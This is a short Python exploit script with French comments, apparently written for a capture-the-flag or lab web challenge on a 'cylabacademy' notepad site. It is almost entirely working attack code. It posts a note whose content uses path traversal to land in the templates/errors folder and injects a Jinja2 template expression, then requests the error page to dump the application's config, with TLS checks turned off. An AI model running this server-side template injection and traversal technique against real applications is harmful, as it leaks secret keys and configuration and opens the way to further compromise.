import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})
# recuperer la vraie repr du config (sans echappement HTML) : on l'ecrit dans un fichier statique et on le lit
content = "\\..\\templates\\errors\\p2{{config|string|list|length}}|{{config|string}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
m = re.search(r"/static/(.+)\.html$", loc)
raw = m.group(1)
name = raw.split("/")[-1]
print("fichier:", name)
r2 = S.get(BASE + "/", params={"error": name[:-len(".html")]}, timeout=20, verify=False)
body = r2.text
import html as H
# extraire le bloc entre la fin du prefixe et <h2>
start = body.find("\\..\\templates\\errors\\p2")
end = body.find("<h2>")
block = H.unescape(body[start:end]).strip()
print("longueur totale annoncee + repr:")
print(block[:200])
print("...")
print(block[-120:])
